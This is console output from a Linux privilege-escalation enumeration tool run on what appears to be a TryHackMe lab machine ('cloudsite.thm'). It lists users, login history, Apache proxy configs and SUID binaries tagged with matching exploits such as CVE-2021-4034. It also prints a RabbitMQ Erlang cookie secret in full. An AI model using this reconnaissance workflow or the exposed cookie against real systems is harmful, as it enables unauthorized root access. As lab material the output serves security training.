══╣ Available Sniffing Tools
tcpdump is available                                                                                                                                                                    
tcpdump version 4.99.1

══╣ Network Interfaces Sniffing Capabilities
Interface eth0: Not sniffable                                                                                                                                                           
No sniffable interfaces found

╔══════════╣ Firewall Rules Analysis
                                                                                                                                                                                        
══╣ Iptables Rules
No permission to list iptables rules                                                                                                                                                    

══╣ Nftables Rules
No permission to list nftables rules                                                                                                                                                    

══╣ Firewalld Rules
firewalld Not Found                                                                                                                                                                     
                                                                                                                                                                                        
══╣ UFW Rules
UFW is not running                                                                                                                                                                      

╔══════════╣ Inetd/Xinetd Services Analysis
                                                                                                                                                                                        
══╣ Inetd Services
inetd Not Found                                                                                                                                                                         
                                                                                                                                                                                        
══╣ Xinetd Services
xinetd Not Found                                                                                                                                                                        
                                                                                                                                                                                        
══╣ Running Inetd/Xinetd Services
Active Services (from netstat):                                                                                                                                                         
-e 
Active Services (from ss):
-e 
Running Service Processes:

╔══════════╣ Internet Access?
Port 443 is not accessible with curl                                                                                                                                                    
Port 80 is not accessible
Port 443 is not accessible
ICMP is not accessible
DNS is not accessible



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                     
                               ╚═══════════════════╝                                                                                                                                    
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                                                 
uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)                                                                                                                                   

╔══════════╣ PGP Keys and Related Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys                                                                                              
GPG:                                                                                                                                                                                    
GPG is installed, listing keys:
-e 
NetPGP:
netpgpkeys Not Found
-e                                                                                                                                                                                      
PGP Related Files:
Found: /home/azrael/.gnupg
total 20
drwx------ 3 azrael azrael 4096 Oct  2 04:18 .
drwx------ 9 azrael azrael 4096 Sep 12  2024 ..
drwx------ 2 azrael azrael 4096 Mar 22  2024 private-keys-v1.d
-rw------- 1 azrael azrael   32 Mar 22  2024 pubring.kbx
-rw------- 1 azrael azrael 1200 Mar 22  2024 trustdb.gpg

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                         
                                                                                                                                                                                        

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                                   
ptrace protection is enabled (1)                                                                                                                                                        

doas.conf Not Found
                                                                                                                                                                                        
╔══════════╣ Checking Pkexec and Polkit
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                                             
                                                                                                                                                                                        
══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec                                                                                                                                                 
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 30872 Feb 26  2022 /usr/bin/pkexec
pkexec version 0.105

══╣ Polkit Policies
Checking /etc/polkit-1/localauthority.conf.d/:                                                                                                                                          

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
Checking /usr/share/polkit-1/rules.d/:
// -*- mode: js2 -*-
polkit.addRule(function(action, subject) {
    if ((action.id === "org.freedesktop.bolt.enroll" ||
         action.id === "org.freedesktop.bolt.authorize" ||
         action.id === "org.freedesktop.bolt.manage") &&
        subject.active === true && subject.local === true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.fwupd.update-internal" &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
// This file is part of systemd.
// See systemd-networkd.service(8) and polkit(8) for more information.

// Allow systemd-networkd to set timezone, get product UUID,
// and transient hostname
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
         action.id == "org.freedesktop.timedate1.set-timezone") &&
        subject.user == "systemd-network") {
        return polkit.Result.YES;
    }
});

══╣ Polkit Authentication Agent
root         616  0.0  0.2 236036  8884 ?        Ssl  03:10   0:00 /usr/libexec/polkitd --no-debug                                                                                      

╔══════════╣ Superusers and UID 0 Users
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                                                                           
                                                                                                                                                                                        
══╣ Users with UID 0 in /etc/passwd
root:x:0:0:root:/root:/bin/bash                                                                                                                                                         

══╣ Users with sudo privileges in sudoers
                                                                                                                                                                                        
╔══════════╣ Users with console
azrael:x:1000:1000:KLI:/home/azrael:/bin/bash                                                                                                                                           
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                  
uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(fwupd-refresh) gid=116(fwupd-refresh) groups=116(fwupd-refresh)
uid=112(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=113(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=114(rtkit) gid=118(rtkit) groups=118(rtkit)
uid=115(epmd) gid=119(epmd) groups=119(epmd)
uid=117(geoclue) gid=122(geoclue) groups=122(geoclue)
uid=118(avahi) gid=124(avahi) groups=124(avahi)
uid=119(cups-pk-helper) gid=125(lpadmin) groups=125(lpadmin)
uid=120(saned) gid=126(saned) groups=126(saned),123(scanner)
uid=121(colord) gid=127(colord) groups=127(colord)
uid=123(gdm) gid=130(gdm) groups=130(gdm)
uid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Currently Logged in Users
                                                                                                                                                                                        
══╣ Basic user information
 04:18:03 up  1:08,  0 users,  load average: 0.92, 0.32, 0.11                                                                                                                           
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Active sessions
 04:18:03 up  1:08,  0 users,  load average: 0.92, 0.32, 0.11                                                                                                                           
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Logged in users (utmp)
           system boot  2026-10-02 03:09                                                                                                                                                
LOGIN      tty1         2026-10-02 03:10               663 id=tty1
LOGIN      ttyS0        2026-10-02 03:10               650 id=tyS0
           run-level 5  2026-10-02 03:11

══╣ SSH sessions
                                                                                                                                                                                        
══╣ Screen sessions
No Sockets found in /run/screen/S-azrael.                                                                                                                                               


══╣ Tmux sessions
                                                                                                                                                                                        
╔══════════╣ Last Logons and Login History
                                                                                                                                                                                        
══╣ Last logins
reboot   system boot  5.15.0-118-gener Fri Oct  2 03:09   still running                                                                                                                 
reboot   system boot  5.15.0-118-gener Fri Sep 20 19:11 - 19:14  (00:03)
root     pts/0        192.168.20.1     Fri Sep 20 21:34 - down   (00:00)
root     pts/0        192.168.20.1     Fri Sep 20 21:15 - 21:34  (00:19)
reboot   system boot  5.15.0-118-gener Fri Sep 20 21:14 - 21:35  (00:20)
root     pts/0        192.168.20.1     Thu Sep 12 22:13 - down   (00:02)
reboot   system boot  5.15.0-118-gener Thu Sep 12 22:13 - 22:15  (00:02)
root     pts/0        192.168.20.1     Thu Sep 12 00:54 - down   (00:00)
root     pts/0        192.168.20.1     Thu Sep 12 00:51 - 00:54  (00:03)
reboot   system boot  5.15.0-118-gener Thu Sep 12 00:49 - 00:55  (00:05)
root     pts/0        192.168.20.1     Thu Sep 12 00:25 - down   (00:20)
reboot   system boot  5.15.0-118-gener Thu Sep 12 00:23 - 00:46  (00:22)
root     pts/0        192.168.20.1     Wed Sep 11 17:48 - down   (00:11)
reboot   system boot  5.15.0-118-gener Wed Sep 11 17:46 - 18:00  (00:13)
root     pts/0        192.168.20.1     Wed Sep 11 17:42 - down   (00:03)
reboot   system boot  5.15.0-118-gener Wed Sep 11 17:42 - 17:46  (00:03)
root     pts/0        192.168.20.1     Wed Sep 11 17:41 - 17:42  (00:01)
root     pts/0        192.168.20.1     Wed Sep 11 17:38 - 17:41  (00:02)
reboot   system boot  5.15.0-118-gener Wed Sep 11 17:37 - 17:42  (00:05)
root     pts/0        192.168.20.1     Wed Sep 11 15:45 - down   (00:05)

wtmp begins Wed Mar 20 17:27:35 2024

══╣ Failed login attempts
                                                                                                                                                                                        
══╣ Recent logins from auth.log (limit 20)
                                                                                                                                                                                        
══╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                       
root             pts/0    192.168.20.1     Fri Sep 20 21:34:57 +0000 2024
azrael           pts/0    192.168.189.1    Fri Aug 16 12:14:56 +0000 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                                        
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                        


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                      
                             ╚══════════════════════╝                                                                                                                                   
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                         
/usr/bin/curl
/snap/bin/lxc
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/socat
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  rpcsvc-proto                           1.4.2-0ubuntu6                          amd64        RPC protocol compiler and definitions                                                   

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.52 (Ubuntu)                                                                                                                                  
Server built:   2024-07-17T18:57:26
httpd Not Found
                                                                                                                                                                                        
Nginx version: nginx Not Found
                                                                                                                                                                                        
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Aug 15  2024 /etc/apache2/sites-enabled                                                                                                                     
drwxr-xr-x 2 root root 4096 Aug 15  2024 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 31 Aug 14  2024 /etc/apache2/sites-enabled/my_site.conf -> ../sites-available/my_site.conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html
    ServerName _
    <Directory "/var/www/html">
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    <IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteCond %{REQUEST_FILENAME} !-f
        RewriteCond %{REQUEST_FILENAME} !-d
        RewriteRule ^ /index.html [L]
    </IfModule>
    <Location /api/>
        ProxyPass http://127.0.0.1:3000/
        ProxyPassReverse http://127.0.0.1:3000/
        ProxyPreserveHost On
    </Location>
    <Location /dashboard/>
        ProxyPass http://127.0.0.1:3000/
        ProxyPassReverse http://127.0.0.1:3000/
        ProxyPreserveHost On
    </Location>
    <Location /api/register>
        ProxyPass http://127.0.0.1:3000/api/register
        ProxyPassReverse http://127.0.0.1:3000/api/register
        ProxyPreserveHost On
    </Location>
    
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 45 Aug 15  2024 /etc/apache2/sites-enabled/storage.cloudsite.thm.conf -> ../sites-available/storage.cloudsite.thm.conf
<VirtualHost *:80>
    ServerAdmin webmaster@storage.cloudsite.thm
    ServerName storage.cloudsite.thm
    DocumentRoot /var/www/storage.cloudsite.thm/
    <Directory /var/www/storage.cloudsite.thm/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    <Location /api/>
        ProxyPass http://127.0.0.1:3000/api/
        ProxyPassReverse http://127.0.0.1:3000/api/
        ProxyPreserveHost On
        RequestHeader set X-Forwarded-For %{REMOTE_ADDR}s
    </Location>
    <Location /dashboard/>
        ProxyPass http://127.0.0.1:3000/dashboard/
        ProxyPassReverse http://127.0.0.1:3000/dashboard/
        ProxyPreserveHost On
        RequestHeader set X-Forwarded-For %{REMOTE_ADDR}s
    </Location>
    ErrorLog ${APACHE_LOG_DIR}/storage.cloudsite.thm_error.log
    CustomLog ${APACHE_LOG_DIR}/storage.cloudsite.thm_access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Aug 14  2024 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    
    Redirect / http://cloudsite.thm/
    
    ErrorLog ${APACHE_LOG_DIR}/ip_redirect_error.log
    CustomLog ${APACHE_LOG_DIR}/ip_redirect_access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 37 Aug 15  2024 /etc/apache2/sites-enabled/cloudsite.thm.conf -> ../sites-available/cloudsite.thm.conf
<VirtualHost *:80>
    ServerAdmin webmaster@cloudsite.thm
    ServerName cloudsite.thm
    DocumentRoot /var/www/cloudsite.thm/
    <Directory /var/www/cloudsite.thm/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    ErrorLog ${APACHE_LOG_DIR}/cloudsite.thm_error.log
    CustomLog ${APACHE_LOG_DIR}/cloudsite.thm_access.log combined
</VirtualHost>


ICMP is not accessible
-rw-r--r-- 1 root root 333 Aug 15  2024 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    
    Redirect / http://cloudsite.thm/
    
    ErrorLog ${APACHE_LOG_DIR}/ip_redirect_error.log
    CustomLog ${APACHE_LOG_DIR}/ip_redirect_access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Aug 14  2024 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    
    Redirect / http://cloudsite.thm/
    
    ErrorLog ${APACHE_LOG_DIR}/ip_redirect_error.log
    CustomLog ${APACHE_LOG_DIR}/ip_redirect_access.log combined
</VirtualHost>




╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html#docker-breakout--privilege-escalation                                                 
-rw-r--r-- 1 root root 757 Nov  6  2023 /usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/jose-1.11.1/priv/Dockerfile                                                                

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Oct 11  2022 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug 15  2024 /etc/pam.d                                                                                                                                     
-rw-r--r-- 1 root root 2133 Jan  2  2024 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                    
drwxr-xr-x 2 root root 4096 Aug 15  2024 /etc/ldap


╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3766 Jun  5  2024 /etc/cloud/cloud.cfg                                                                                                                           
    lock_passwd: True
-rw-r--r-- 1 root root 3786 Dec  8  2022 /snap/core20/1828/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3756 Feb 27  2024 /snap/core20/2318/etc/cloud/cloud.cfg
    lock_passwd: True

╔══════════╣ Analyzing Erlang Files (limit 70)
-r-----r-- 1 rabbitmq rabbitmq 16 Oct  2 03:10 /var/lib/rabbitmq/.erlang.cookie                                                                                                         
uOJn1gFOvRhmAmrX

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 13  2024 /etc/apt/keyrings                                                                                                                              
drwx------ 2 azrael azrael 4096 Jul 18  2024 /home/azrael/.local/share/keyrings
drwxr-xr-x 2 root root 200 Feb  7  2023 /snap/core20/1828/usr/share/keyrings
drwxr-xr-x 2 root root 200 Apr 16  2024 /snap/core20/2318/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Aug 15  2024 /usr/share/keyrings




╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1828/usr/share/bash-completion/completions/postfix                                                                                 

-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/2318/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 761 Nov 15  2021 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind                                                                                                     
-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc                                                                                                                              
-rw-r--r-- 1 azrael azrael 3771 Feb 25  2020 /home/azrael/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1828/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/2318/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 azrael azrael 807 Feb 25  2020 /home/azrael/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1828/etc/skel/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/2318/etc/skel/.profile




╔══════════╣ Analyzing FreeIPA Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug 15  2024 /usr/src/linux-headers-5.15.0-118/drivers/net/ipa                                                                                              




╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                                        
MySQL process not found.
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                            
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                        
                                                                                                                                                                                        
-rw-r--r-- 1 root root 2794 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw------- 1 azrael azrael 1200 Mar 22  2024 /home/azrael/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1828/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1828/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1828/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1828/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1828/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/2318/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/2318/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/2318/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/2318/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/2318/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2899 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 3023 Mar 26  2021 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 1150 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
-rw-r--r-- 1 root root 2247 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-cis.gpg
-rw-r--r-- 1 root root 2236 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
-rw-r--r-- 1 root root 2275 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-fips.gpg
-rw-r--r-- 1 root root 2275 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-fips-preview.gpg
-rw-r--r-- 1 root root 2250 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Apr 30  2024 /usr/share/keyrings/ubuntu-pro-ros.gpg


drwx------ 3 azrael azrael 4096 Oct  2 04:18 /home/azrael/.gnupg


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                          
passwd file: /etc/passwd
passwd file: /snap/core20/1828/etc/pam.d/passwd
passwd file: /snap/core20/1828/etc/passwd
passwd file: /snap/core20/1828/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1828/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1828/var/lib/extrausers/passwd
passwd file: /snap/core20/2318/etc/pam.d/passwd
passwd file: /snap/core20/2318/etc/passwd
passwd file: /snap/core20/2318/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/2318/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/2318/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                             
                                                                                                                                                                                        




-rw-r--r-- 1 root root 602 Mar 20  2024 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 174 Mar 20  2024 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 94 Mar 20  2024 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 566 Mar 20  2024 /etc/ssh/ssh_host_rsa_key.pub

UsePAM yes
══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem                                                                                                                                                              
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
4366PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket                                                                                                                         
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                          
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                        


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                                                                                   
tmux 3.2a                                                                                                                                                                               


/tmp/tmux-1000



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                      
                      ╚════════════════════════════════════╝                                                                                                                            
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                         
strings Not Found                                                                                                                                                                       
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd                                                                                                                                
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 47K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 35K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 31K Feb 26  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 55K Apr 14  2022 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 331K Jun 26  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 148K Jul 26  2024 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
